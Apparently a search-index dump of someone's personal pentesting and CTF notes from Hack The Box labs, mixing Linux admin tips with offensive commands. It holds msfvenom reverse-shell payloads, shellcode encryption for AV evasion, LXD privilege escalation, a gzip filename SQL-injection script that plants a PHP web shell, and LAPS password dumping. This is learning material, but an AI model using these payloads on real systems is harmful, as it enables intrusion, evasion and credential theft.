README)","text":"<p>https://wiki.debian.org/SystemGroups</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#atom","title":"Atom","text":"<p>https://github.com/nwinkler/atom-keyboard-shortcuts</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#customizing-bash-prompt","title":"customizing bash prompt","text":"<p>https://help.ubuntu.com/community/CustomizingBashPrompt</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#enumeration-scripts-tools","title":"Enumeration scripts / tools","text":"<p>https://github.com/diego-treitos/linux-smart-enumeration https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh</p>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#sqlite-sqli","title":"sqlite sqli:","text":"<p>https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf</p> <pre><code>https://wfuzz.readthedocs.io/en/latest/user/advanced.html\nwfuzz -z range,1-10 -u \"https://www.nestedflanders.htb/index.php?id=FUZZ\"\nwfuzz -e payloads\n</code></pre> <pre><code>sqlmap -u \"https://www.nestedflanders.htb/index.php?id=1\" --method=GET -p id --technique=BEUSQ --level=5 --risk=3\n\nsqlmap --list tamper\n</code></pre> <pre><code>https://gist.github.com/subfuzion/08c5d85437d5d4f00e58\ncurl -H 'Host: yada.com' http://127.0.0.1/something\ncurl --resolve 'yada.com:80:127.0.0.1' http://yada.com/something\n</code></pre> <pre><code>ip neigh\nip tcp_metrics\narp history\nroute -n\n\ncat /etc/resolv.conf\n</code></pre> <pre><code>wget -r http://10.10.10.XX/directory/with/content/\n</code></pre> <pre><code>find /home/ -printf \"%f\\t%p\\t%u\\t%g\\t%m\\n\" 2&gt;/dev/null|column -t\n</code></pre> <pre><code>https://forum.ivorde.com/tcpdump-how-to-to-capture-only-icmp-ping-echo-requests-t15191.html\ntcpdump -i any -s 0 -l -w - dst port 3306 | strings\n\n# only pings\ntcpdump -nni eth0 icmp\n\n# IPv6\ntcpdump -i tun0 -vv ip6\n</code></pre> <pre><code>## based on https://superuser.com/questions/39751/add-directory-to-path-if-its-not-already-there\n\npathadd() {\n    if [ -d \"$1\" ] &amp;&amp; [[ \":$PATH:\" != *\":$1:\"* ]]; then\n        PATH=\"${PATH:+\"$PATH:\"}$1\"\n    fi\n}\n\npath_add_beginning() {\n    if [ -d \"$1\" ] &amp;&amp; [[ \":$PATH:\" != *\":$1:\"* ]]; then\n        PATH=\"$1${PATH:+\":$PATH\"}\"\n    fi\n}\n</code></pre>"},{"location":"miscellaneous/to_sort/misc_to_be_sorted/#html-table-renders-within-markdown","title":"HTML table renders within markdown","text":"Layer 1 Layer 2 Layer 3 L1 Name L2 Name A L3 Name A L3 Name B L2 Name B L3 Name C L3 Name D"},{"location":"miscellaneous/to_sort/to_sort/","title":"To sort","text":""},{"location":"miscellaneous/to_sort/to_sort/#to-be-sorted","title":"To be Sorted","text":"<p>https://askubuntu.com/questions/152001/how-can-i-get-octal-file-permissions-from-command-line</p> <p>stat -c \"%a %n\" *</p> <p>for x in $(find . -name .git -type d -prune -exec dirname {} \\;); do cd \"$x\"; echo $x; git status -s; cd ..; done</p> <p>tput cols</p> <p>RPC enumeration: rpcclient -U \"\" 10.10.10.151</p> <p>nmblookup -A 10.10.10.151</p> <p>[=] nmblookup -A 10.10.10.151 [=] smbclient //MOUNT/share -I 10.10.10.151 N [=] smbclient -L //10.10.10.151 [=] enum4linux -a 10.10.10.151 [=] rpcclient -U \"\" 10.10.10.151</p> <p>crackmapexec</p> <p>sudo apt install smtp-user-enum sudo apt install telnet</p> <p>apt: claws-mail thunderbird</p> <p>pip: pycryptodome</p> <p>sudo ln -s /usr/bin/ipython3 /usr/bin/ipython</p> <p>ipython3 nbconvert --to script *</p> <p>https://hub.docker.com/r/sagemath/sagemath/ docker pull sagemath/sagemath</p> <p>docker run -it sagemath/sagemath:latest docker run --rm -p8888:8888 sagemath/sagemath:latest sage-jupyter</p> <p>sudo apt install httping</p> <p>ping through proxy: httping -x proxy -g url</p> <p>https://stackoverflow.com/questions/2711001/how-to-apply-shell-command-to-each-line-of-a-command-output</p> <p>Add to install script: sudo apt install httping https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite https://github.com/mxrch/webwrap</p> <p>https://github.com/mevdschee/shell.php/blob/master/shell.php</p> <p>https://github.com/mm0r1/exploits/blob/master/php7-backtrace-bypass/exploit.php</p> <p>Powershell: check current user:</p> <pre><code>[System.Security.Principal.WindowsIdentity]::GetCurrent().Name\n</code></pre> <p>See owner of file:</p> <pre><code>Get-Acl user.txt | select-object owner\nGet-Acl C:\\Scripts\\Test.txt | Select-Object Owner\nGet-Acl C:\\Scripts\\Test.txt | Format-List\n</code></pre> <p>Recursively look for text in files:</p> <pre><code>Get-ChildItem -Recurse | Select-String \"dummy\" -List | Select Path\n</code></pre>"},{"location":"miscellaneous/to_sort/to_sort/#add-exploits-from-exploit-db-to-metasploit","title":"Add exploits from exploit-db to metasploit:","text":"<pre><code># mkdir ~/.msf4/modules/exploits\n# mkdir ~/.msf4/modules/exploits/&lt;path from searchsploit&gt;\ncp &lt;file&gt; ~/.msf4/modules/exploits/&lt;path from searchsploit&gt;\nupdatedb\n</code></pre> <p>Discovery Script: https://github.com/leebaird/discover</p> <p>Change editor for visudo:</p> <pre><code>sudo update-alternatives --config editor\n</code></pre> <p>sqsh dbeaver</p> <p>rdesktop -g 1000x900 ip</p> <p>lxc privesc https://reboare.github.io/lxd/lxd-escape.html https://github.com/saghul/lxd-alpine-builder</p> <pre><code># https://reb\nlxc image import alpine_file.tar.gz --alias alpine\nlxc image list\nlxc init alpine privesc -c security.privileged=true\nlxc list\nlxc config device add privesc host-root disk source=/ path=/mnt/root\nlxc start privesc\nlxc exec privesc /bin/sh\n</code></pre> <p>pip install audiodiff</p> <pre><code>import audiodiff\naudiodiff.audio_equal('file1', 'file2')\n</code></pre>"},{"location":"miscellaneous/to_sort/to_sort/#cron","title":"cron","text":"<p>syntax help - from https://en.wikipedia.org/wiki/Cron</p> <pre><code># \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 minute (0 - 59)\n# \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 hour (0 - 23)\n# \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of the month (1 - 31)\n# \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 month (1 - 12)\n# \u2502 \u2502 \u2502 \u2502 \u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 day of the week (0 - 6) (Sunday to Saturday;\n# \u2502 \u2502 \u2502 \u2502 \u2502                                   7 is also Sunday on some systems)\n# \u2502 \u2502 \u2502 \u2502 \u2502\n# \u2502 \u2502 \u2502 \u2502 \u2502\n# * * * * * &lt;command to execute&gt;\n</code></pre> <p>https://crontab.guru/</p> <p>ps -fu<code>whoami</code> --sort=start_time</p> <p>Zone Transfer:</p> <pre><code>dig axfr @ip_address hostname\n</code></pre> <p>sslyze:</p> <pre><code>sslyze --regular ip_address\n</code></pre> <p>Alternate Data streams: - autopsy (application) - <code>getfattr filename</code>   - <code>getfattr -d filename</code>   - <code>getfattr -n user.FILEO --only-values filename &gt; output.png</code> (may not be exactly right)</p> <p>busybox</p> <pre><code>fls -f ntfs family.ntfs\nmmls -i list\nimg_stat family_ntfs\n</code></pre> <p>hashes: https://hashkiller.io/listmanager</p> <p>https://pypi.org/project/netifaces/</p> <pre><code>meterpreter &gt; load powershell\nLoading extension powershell...Success.\n\nmeterpreter &gt; powershell_\npowershell_execute  powershell_import   powershell_shell\n\nmeterpreter &gt; powershell_shell\n</code></pre> <p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 --encrypt rc4 --encrypt-key thisisakey -f c</p>"},{"location":"miscellaneous/to_sort/to_sort/#av-evasion","title":"AV evasion:","text":""},{"location":"miscellaneous/to_sort/to_sort/#shellcodewrapper","title":"ShellcodeWrapper","text":"<p>https://github.com/Arno0x/ShellcodeWrapper</p> <pre><code>root@kali:~/Documents/htb/boxes/resolute# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=9001 -f raw &gt; shell.raw\n[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload\n[-] No arch selected, selecting arch: x64 from the payload\nNo encoder or badchars specified, outputting raw payload\nPayload size: 510 bytes\n</code></pre> <pre><code>root@kali:~/Downloads/ShellcodeWrapper# ./shellcode_encoder.py -cs /root/Documents/htb/boxes/resolute/shell.raw blahblahblah aes\n[*] Shellcode file [/root/Documents/htb/boxes/resolute/shell.raw] successfully loaded\n[*] MD5 hash of the initial shellcode: [0b0f822711ed85f8b214d803d9ef2982]\n[*] Shellcode size: [510] bytes\n[*] AES encrypting the shellcode with 128 bits derived key [t0WwU4GuehG1HjRyM0HTrg==]\n\n==================================== RESULT ====================================\n\n[*] Encrypted shellcode size: [528] bytes\n[*] Generating C# code file\n[+] C# code file saved in [./result/encryptedShellcodeWrapper_aes.cs]\n</code></pre> <pre><code>root@kali:~/Downloads/ShellcodeWrapper# cd result\n\nroot@kali:~/Downloads/ShellcodeWrapper/result# mcs encryptedShellcodeWrapper_aes.cs\n\nroot@kali:~/Downloads/ShellcodeWrapper/result# ls\nencryptedShellcodeWrapper_aes.cs  encryptedShellcodeWrapper_aes.exe\n</code></pre>"},{"location":"miscellaneous/to_sort/to_sort/#python-create-gz-file-with-malicious-filename","title":"Python - create gz file with malicious filename","text":"<pre><code>#!/usr/bin/env python3\nimport gzip\nfrom io import BytesIO\n\n\npayload_1 = \"\"\"a\\\"'); attach database 'a.php' as a; create table a.p (d text); --\"\"\"\npayload_2 = \"\"\"a\\\"');attach database 'a.php' as a;INSERT INTO a.p (d) VALUES ('&lt;?php system($_GET[\\\"c\\\"]);?&gt;');--\"\"\"\n\ndef create_gz_file(gz_filename, payload):\n    with open(gz_filename, \"wb\") as f:\n        f.write(gzip.GzipFile(filename=payload, mode='wb', fileobj=BytesIO()).fileobj.getvalue())\n\ncreate_gz_file(\"file_1.gz\", payload_1)\ncreate_gz_file(\"file_2.gz\", payload_2)\n</code></pre> <pre><code>HISTSIZE=1000\nHISTFILESIZE=2000\n\nHISTFILESIZE\n       The maximum number of lines contained in the history file.  When this variable is assigned a value, the history file is truncated, if necessary, to contain no more than  that  number  of\n       lines  by  removing  the  oldest  entries.  The history file is also truncated to this size after writing it when a shell exits.  If the value is 0, the history file is truncated to zero\n       size.  Non-numeric values and numeric values less than zero inhibit truncation.  The shell sets the default value to the value of HISTSIZE after reading any startup files.\nHISTSIZE\n       The  number  of  commands to remember in the command history (see HISTORY below).  If the value is 0, commands are not saved in the history list.  Numeric values less than zero result in\n       every command being saved on the history list (there is no limit).  The shell sets the default value to 500 after reading any startup files.\n\n\n## update the HISTFILESIZE and HISTSIZE values within .bashrc:\nsed -i 's/HISTFILESIZE=2000/HISTFILESIZE=20000/' ~/.bashrc\nsed -i 's/HISTSIZE=1000/HISTSIZE=10000/' ~/.bashrc\n</code></pre> <pre><code># Bash colors\noff='\\033[0m'       # Text Reset\nred='\\033[0;91m'          # Red\ngrn='\\033[0;32m'        # Green\nyel='\\033[0;33m'       # Yellow\n\ndef err(msg):\n    print(f\"{red}[-] {msg}{off}\")\n\ndef good(msg):\n    print(f\"{grn}[+] {msg}{off}\")\n\ndef info(msg):\n    print(f\"[*] {msg}\"\n</code></pre> <p>https://sushant747.gitbooks.io/total-oscp-guide/pass_the_hash_-_reusing_hashes.html</p> <p>https://github.com/samratashok/Kautilya/ https://n0where.net/powershell-penetration-testing-framework-nishang</p> <p>https://github.com/padovah4ck/PSByPassCLM https://github.com/stonepresto/CLMBypass https://chickenpwny.github.io/concepts/bypass/</p> <p>https://github.com/ankh2054/windows-pentest</p> <p>https://github.com/Reslient/Privilege-Escalation-Windows</p> <p>chm - https://gist.github.com/mgeeky/cce31c8602a144d8f2172a73d510e0e7</p> <p>https://github.com/sensepost/reGeorg</p> <p>https://adrianmejia.com/how-to-set-up-samba-in-ubuntu-linux-and-access-it-in-mac-os-and-windows/</p> <p>https://malicious.link/post/2017/dump-laps-passwords-with-ldapsearch/</p> <pre><code>ldapsearch -x -h 192.168.80.10 -D \"helpdesk\" -w ASDqwe123 -b \"dc=sittingduck,dc=info\" \"(ms-MCS-AdmPwd=*)\" ms-MCS-AdmPwd\n\nldapsearch -z 0 -b \"o=somecompany.com\" -D \"cn=manager,o=somecompany.com\" -W \"(objectclass=*)\"\n\nldapsearch -H ldap://forestdnszones.htb.local -x -LLL -b \"dc=htb,dc=local\" -W \"(objectclass=*)\"\n\nldapsearch -H ldap://htb.local -x -LLL -b \"dc=htb,dc=local\" -W \"(objectclass=*)\"\n</code></pre> <p>https://github.com/gentilkiwi/mimikatz/wiki/howto-~-decrypt-EFS-files</p> <p>Juicy Potato: If you have SeAssingPrimaryToken or SeImpersonate privileges, you are SYSTEM.</p> <p>gdb:</p> command Description info functions All function names <p>https://github.com/cornerpirate/socat-shell.git</p>"},{"location":"miscellaneous/to_sort/to_sort/#screenshot-for-cherrytree","title":"Screenshot (for CherryTree","text":""},{"location":"miscellaneous/to_sort/to_sort/#ctrl-shift-prt-screen","title":"Ctrl + Shift + Prt Screen","text":"<p>Docker (for escalation): ariekei olympus</p> <p>MOF</p>"},{"location":"miscellaneous/to_sort/to_sort/#httpspastebincomkwb3jyxw","title":"https://pastebin.com/KWB3JYXW","text":"<p>Dropbox</p> <p>eog - a GNOME image viewer</p> <p>Things to research: - RetDec   - https://retdec.com/   - https://github.com/avast/retdec</p> <p>https://www.contextis.com/en/blog/linux-privilege-escalation-via-dynamically-linked-shared-object-library https://stackoverflow.com/questions/14884126/build-so-file-from-c-file-using-gcc-command-line</p> <p>https://ctf101.org/binary-exploitation/stack-canaries/ https://0x00sec.org/t/exploit-mitigation-techniques-stack-canaries/5085 https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/ https://www.cs.purdue.edu/homes/xyzhang/spring07/Papers/defeat-stackguard.pdf</p> <p>https://radare.gitbooks.io/radare2book/visual_mode/visual_disassembly.html https://reverseengineering.stackexchange.com/questions/15244/how-to-use-radare2-to-disassemble-an-executable-file</p> <p>http://web.cecs.pdx.edu/~apt/cs491/gdb.pdf</p> <p>https://reverseengineering.stackexchange.com/questions/1935/how-to-handle-stripped-binaries-with-gdb-no-source-no-symbols-and-gdb-only-sho</p> <p>https://github.com/ekalinin/github-markdown-toc</p> <p>https://pentest-tools.com/blog/xss-attacks-practical-scenarios/ https://www.w3schools.com/whatis/whatis_ajax.asp https://github.com/HarmJ0y</p> <p>https://0x00sec.org/t/kernel-rootkits-getting-your-hands-dirty/1485</p> <p>https://www.rapidtables.com/convert/number/hex-to-ascii.html</p> <p>https://threatexpress.com/blogs/2019/penetration-testing-pasties/</p> <p>https://regexr.com/</p> <p>https://www.w3resource.com/php/function-reference/print_r.php</p> <p>https://wiki.ubuntu.com/Security/Privileges</p> <p>import requests requests.get(\"http://factordb.com/api\", params={\"query\": str(16)}).json()</p> <p>Procdump https://docs.microsoft.com/en-us/sysinternals/downloads/procdump</p> <p>https://github.com/gentilkiwi/mimikatz https://github.com/gentilkiwi/mimikatz/releases</p> <p>python /opt/Reconnoitre/Reconnoitre/reconnoitre.py -t 10.10.10.149 --virtualhosts -o <code>pwd</code> -w /opt/virtual-host-discovery/wordlist --ignore-content-length 2058 --hostnames</p> <p>nmap --script-updatedb</p> <p>Cheatsheets: * https://en.wikipedia.org/wiki/List_of_file_signatures * https://darkdust.net/files/GDB%20Cheat%20Sheet.pdf</p> <p>https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist</p> <p>Kali function to identify hash type - hash-identifier</p> <p>https://hashkiller.co.uk/Cracker/MD5</p> <p>https://www.cyberciti.biz/faq/what-process-has-open-linux-port/ https://www.cyberciti.biz/faq/linux-find-largest-file-in-directory-recursively-using-find-du/</p> <p>http://bhami.com/rosetta.html</p> <p>https://portswigger.net/web-security/xxe/blind/lab-xxe-trigger-error-message-by-repurposing-local-dtd https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs</p> <p>https://web.archive.org/web/20190623013724/http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</p> <p>https://bernardodamele.blogspot.com/</p> <p>Emojis for terminal \ud83d\udc9a \u26a0\ufe0f \ud83d\udeab</p> <p>JWT: * https://jwt.io/ * https://www.jsonwebtoken.io/ * https://www.jstoolset.com/jwt</p> <p>iPython: https://ipython.readthedocs.io/en/stable/interactive/magics.html</p> <p>https://stackoverflow.com/questions/30056762/rsa-encryption-and-decryption-in-python</p> <p>/usr/share/windows-binaries/</p> <p>git clone https://github.com/TheZ3ro/gogsownz</p> <p>jshell (interactive java repl shell) https://medium.com/@maheshwar.ligade/interactive-java-repl-shell-91d7b2237eb1 https://docs.oracle.com/javase/10/jshell/introduction-jshell.htm#JSHEL-GUID-465BA4F5-E77D-456F-BCB7-D826AC1E18AE</p> <p>guballa.de/substitution-solver quipqiup.com</p> <p>sudo apt-get install python3-qrtools</p> <p>sudo pip install pyjwt https://pyjwt.readthedocs.io/en/latest/</p> <p>Decode a Flask Session cookie, given the cookie and secret key https://gist.github.com/babldev/502364a3f7c9bafaa6db</p> <p>https://github.com/brendan-rius/c-jwt-cracker</p> <p>https://www.ostechnix.com/use-google-translate-commandline-linux/ sudo apt-get install translate-shell</p> <p>https://ghidra-sre.org/CheatSheet.html</p> <p>https://ethicalhackingguru.com/the-lxd-privilege-escalation-tutorial-how-to-exploit-lxd/ https://www.exploit-db.com/exploits/46978 https://book.hacktricks.xyz/linux-unix/privilege-escalation/lxd-privilege-escalation</p> <p>git clone https://github.com/saghul/lxd-alpine-builder.git cd lxd-alpine-builder ./build-alpine</p> <pre><code>shopt -s extdebug\n\npreexec_invoke_exec () {\n    [ -n \"$COMP_LINE\" ] &amp;&amp; return  # do nothing if completing\n    [ \"$BASH_COMMAND\" = \"$PROMPT_COMMAND\" ] &amp;&amp; return # don't cause a preexec for $PROMPT_COMMAND\n    local this_command=`HISTTIMEFORMAT= history 1 | sed -e \"s/^[ ]*[0-9]*[ ]*//\"`;\n\n    # So that you don't get locked accidentally\n    if [ \"shopt -u extdebug\" == \"$this_command\" ]; then\n        return 0\n    fi\n\n    # Modify $this_command and then execute it\n    echo $this_command\n    return 0\n    #return 1 # This prevent executing of original command\n}\ntrap 'preexec_invoke_exec' DEBUG\n</code></pre> <pre><code>pkill VBoxClient\n# sudo pkill VBoxClient\n</code></pre> <p>/usr/local/sbin:/sbin</p> <p>export PATH=/home/glasgow/anaconda3/bin:$PATH</p> <p>https://www.jetbrains.com/help/pycharm/working-with-the-ide-features-from-command-line.html sudo ln -s /opt/pycharm-anaconda-2020.1.1/bin/pycharm.sh /usr/local/bin/pycharm</p> <p>glasgow@kali:~$ ls /etc/profile.d/ bash_completion.sh  gawk.csh  gawk.sh  kali.sh  vte-2.91.sh  vte.csh</p> <p>root@kali:/home/glasgow# which VBoxClient /usr/bin/VBoxClient</p> <p>root - path /sbin /usr/local/sbin /usr/sbin</p> <p>glasgow - path /home/glasgow/go/bin</p> <p>/usr/sbin/</p>"},{"location":"miscellaneous/to_sort/to_sort/#for-setting-history-length-see-histsize-and-histfilesize-in-bash1","title":"for setting history length see HISTSIZE and HISTFILESIZE in bash(1)","text":"<p>HISTSIZE=10000 HISTFILESIZE=200000</p> <p>echo \"blah\" | tr '[:lower:]' '[:upper:]'</p> <p>https://www.virtualbox.org/manual/ch04.html#additions-linux</p> <p>Add .local/bin to PATH /home/glasgow/.local/bin</p> <p>https://github.com/codingo/Interlace</p> <p>glasgow@kali:~/Documents/htb/boxes/dyplesher/release/minecraft$ git help -g</p> <p>The common Git guides are:    attributes          Defining attributes per path    cli                 Git command-line interface and conventions    core-tutorial       A Git core tutorial for developers    cvs-migration       Git for CVS users    diffcore            Tweaking diff output    everyday            A useful minimum set of commands for Everyday Git    glossary            A Git Glossary    hooks               Hooks used by Git    ignore              Specifies intentionally untracked files to ignore    modules             Defining submodule properties    namespaces          Git namespaces    repository-layout   Git Repository Layout    revisions           Specifying revisions and ranges for Git    submodules          Mounting one repository inside another    tutorial            A tutorial introduction to Git    tutorial-2          A tutorial introduction to Git: part two    workflows           An overview of recommended workflows with Git</p> <p>'git help -a' and 'git help -g' list available subcommands and some concept guides. See 'git help ' or 'git help ' to read about a specific subcommand or concept. See 'git help git' for an overview of the system. <pre><code>misc/uglybash\n265 solves / 389 points\n\nThis bash script evaluates to echo dont just run it, dummy # flag{...} where the flag is in the comments.\n\nThe comment won't be visible if you just execute the script. How can you mess with bash to get the value right before it executes?\n\nEnjoy the intro misc chal.\n\nDownloads\ncmd.sh\n</code></pre> <p>glasgow@kali:~/Downloads$ bash -x cmd.sh 2&gt;&amp;1|grep printf|tail -n 21|cut -d\" \" -f4|tr -d \"\\n'\" flag{us3_zsh,_dummy}</p> <pre><code>https://wiki.gentoo.org/wiki/Nano/Basics_Guide\n\nhttps://asciinema.org/~Shodan\n\nhttps://sushant747.gitbooks.io/total-oscp-guide/content/local_file_inclusion.html\n\nhttps://github.com/ctf-wiki/ctf-wiki/\n\nhttps://github.com/phra/rustbuster\nhttps://github.com/internetwache/GitTools\nhttps://github.com/mxrch/penglab\n\nhttps://pypi.org/project/pipreqs/\n\n\nhttps://github.com/tobor88/Bash/blob/master/kali-setup.sh\n\n\nwafwoof\nlbd (load balancing check)\nhttrack (copy website)\n\n\ndelete lines from vi that match condition:\n</code></pre> <p>:g/nologin/d</p> <pre><code>grep certain length:\n</code></pre> <p>grep -x '.{3,7}' strings filename | grep -x '.{10, }'</p> <pre><code>add directory to path if doesn't exist (https://superuser.com/questions/39751)\n</code></pre> <p>pathadd() {     if [ -d \"$1\" ] &amp;&amp; [[ \":$PATH:\" != \":$1:\" ]]; then         PATH=\"${PATH:+\"$PATH:\"}$1\"     fi } ```</p> <p>Python environment variables:</p> <p>CTF_notes htb_notes PenTesting</p> <p>(venv) glasgow@kali:~/Documents/github/PenTesting$ pip list Package                    Version</p> <p>click                      7.1.2  future                     0.18.2 Jinja2                     2.11.2 joblib                     0.14.1 livereload                 2.6.1  lunr                       0.5.6  Markdown                   3.2.2  MarkupSafe                 1.1.1  mkdocs                     1.1    mkdocs-material            5.1.6  mkdocs-material-extensions 1.0b2  nltk                       3.5    pip                        20.0.2 pkg-resources              0.0.0  Pygments                   2.6.1  pymdown-extensions         7.1    PyYAML                     5.3.1  regex                      2020.5.7 setuptools                 44.0.0 six                        1.14.0 tornado                    6.0.4  tqdm                       4.46.0</p> <p>http://omni.htb:8080/</p> <p>glasgow@kali:~/opt$ ls ApacheDirectoryStudio binaries cutter Enumeration eviler-winrm ghidra jbe php phpbash pspy python-pty-shells Reconnoitre ropstar RsaCtfTool socat-shell virtual-host-discovery</p> <p>https://gchq.github.io/CyberChef/</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#user-enumeration https://github.com/absolomb/WindowsEnum https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/ https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html?q=whoami%20 https://chryzsh.gitbooks.io/pentestbook/oscp.html https://chryzsh.gitbooks.io/pentestbook/privilege_escalation_windows.html https://jupyterlab.readthedocs.io/en/stable/getting_started/installation.html https://github.com/gabemart/hipku https://gabrielbrady.com/projects/hipku/ https://github.com/actions/starter-workflows/blob/master/ci/blank.yml</p>"},{"location":"miscellaneous/to_sort/virtualbox_to_sort/","title":"Virtualbox to sort","text":"<pre><code>mkdir -p /mnt/host\nmount -t vboxsf SharedFolder /mnt/host\n</code></pre> <p>Notes to store: virtualbox - shared clipboard issue: https://forums.virtualbox.org/viewtopic.php?t=15679</p> <p>Kill shared clipboard process and restart:</p> <pre><code>alias fix_VBox=\"pkill VBoxClient 2&gt;/dev/null; VBoxClient --clipboard &amp;&amp; VBoxClient --seamless &amp;&amp; VBoxClient --draganddrop\"\n</code></pre>"}]}